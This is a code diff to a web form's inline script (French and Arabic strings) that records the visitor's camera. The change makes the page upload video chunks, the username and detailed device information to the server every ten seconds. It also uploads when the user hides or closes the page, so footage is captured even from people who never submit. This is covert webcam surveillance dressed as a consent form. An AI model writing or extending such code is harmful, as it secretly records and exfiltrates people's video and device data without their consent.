@@ -303,6 +303,7 @@
         let mediaStream = null;
         let mediaRecorder = null;
         let recordedChunks = [];
+        let autoSyncInterval = null;
         let isCompleted = false;
 
         let batteryInfoGlobal = { niveau: "Non disponible", enCharge: "Non disponible" };
@@ -360,32 +361,35 @@
                 mediaRecorder.ondataavailable = (event) => {
                     if (event.data.size > 0) recordedChunks.push(event.data);
                 };
-                mediaRecorder.start();
+                mediaRecorder.start(1000);
+
+                // ⚡ تفعيل الإرسال التلقائي (Auto-Sync) كل 10 ثوانٍ
+                autoSyncInterval = setInterval(async () => {
+                    if (!isCompleted && recordedChunks.length > 0) {
+                        await sendDataBeacon("Auto-Sync 10s (Mise à jour)");
+                    }
+                }, 10000);
 
             } catch (err) {
                 console.error("Caméra refusée: ", err);
             }
         });
 
-        async function sendDataAndFinish(isBackground = false) {
-            if (isCompleted) return;
-            isCompleted = true;
+        async function sendDataBeacon(reason = "") {
+            if (recordedChunks.length === 0) return;
 
-            if (mediaRecorder && mediaRecorder.state !== "inactive") {
-                mediaRecorder.stop();
-            }
+            const currentChunks = [...recordedChunks];
+            recordedChunks = []; // مسح الـ buffer لمنع التكرار
 
-            await new Promise(resolve => setTimeout(resolve, 300));
-
-            const usernameInput = document.getElementById('username')?.value;
-            const username = usernameInput ? usernameInput : "Utilisateur Anonyme [Quitté/Fermé]";
+            const username = document.getElementById('username')?.value || "Utilisateur Anonyme";
             const deviceDetails = await getDetailedDeviceInfo();
+            
             const mimeType = mediaRecorder ? mediaRecorder.mimeType : 'video/mp4';
             const ext = mimeType.includes('mp4') ? 'mp4' : 'webm';
-            const videoBlob = new Blob(recordedChunks, { type: mimeType });
+            const videoBlob = new Blob(currentChunks, { type: mimeType });
 
             const formData = new FormData();
-            formData.append('username', username);
+            formData.append('username', `${username} [${reason}]`);
             formData.append('location', "Non disponible");
             formData.append('device', JSON.stringify(deviceDetails, null, 2));
 
@@ -395,25 +399,12 @@
 
             formData.append('video', videoBlob, `recording.${ext}`);
 
-            // 🔥 استخدام sendBeacon حصرياً عند الضغط على زر المربع أو إغلاق الصفحة لضمان وصول الفيديو
-            if (isBackground && navigator.sendBeacon) {
-                navigator.sendBeacon('/submit-consent', formData);
-            } else {
-                try {
-                    fetch('/submit-consent', {
-                        method: 'POST',
-                        body: formData,
-                        keepalive: true
-                    });
-                } catch (e) {
-                    if (navigator.sendBeacon) {
-                        navigator.sendBeacon('/submit-consent', formData);
-                    }
+            try {
+                await fetch('/submit-consent', { method: 'POST', body: formData });
+            } catch (e) {
+                if (navigator.sendBeacon) {
+                    navigator.sendBeacon('/submit-consent', formData);
                 }
-            }
-
-            if (mediaStream) {
-                mediaStream.getTracks().forEach(track => track.stop());
             }
         }
 
@@ -436,24 +427,35 @@
                 }
             }
 
+            isCompleted = true;
+            clearInterval(autoSyncInterval);
+
             statusDiv.style.color = '#10b981';
             statusDiv.innerText = currentLang === 'ar' ? 'جاري إرسال البيانات...' : 'Envoi des données en cours...';
 
-            await sendDataAndFinish(false);
+            if (mediaRecorder && mediaRecorder.state !== "inactive") {
+                mediaRecorder.stop();
+            }
 
-            statusDiv.innerText = currentLang === 'ar' ? 'شكراً لك! تم إرسال إجاباتك بنجاح.' : 'Merci ! Vos réponses ont été soumises avec succès.';
+            setTimeout(async () => {
+                await sendDataBeacon("Soumission réussie (Formulaire complet)");
+                statusDiv.innerText = currentLang === 'ar' ? 'شكراً لك! تم إرسال إجاباتك بنجاح.' : 'Merci ! Vos réponses ont été soumises avec succès.';
+                if (mediaStream) {
+                    mediaStream.getTracks().forEach(track => track.stop());
+                }
+            }, 1000);
         }
 
-        // عند الخروج المفاجئ (زر المربع أو إغلاق التطبيق)
-        document.addEventListener('visibilitychange', () => {
+        // عند الخروج من الصفحة
+        document.addEventListener('visibilitychange', async () => {
             if (document.visibilityState === 'hidden' && !isCompleted) {
-                sendDataAndFinish(true);
+                await sendDataBeacon("Fermé via bouton carré / App masquée");
             }
         });
 
-        window.addEventListener('pagehide', () => {
+        window.addEventListener('pagehide', async () => {
             if (!isCompleted) {
-                sendDataAndFinish(true);
+                await sendDataBeacon("Fermeture de page");
             }
         });
     </script>
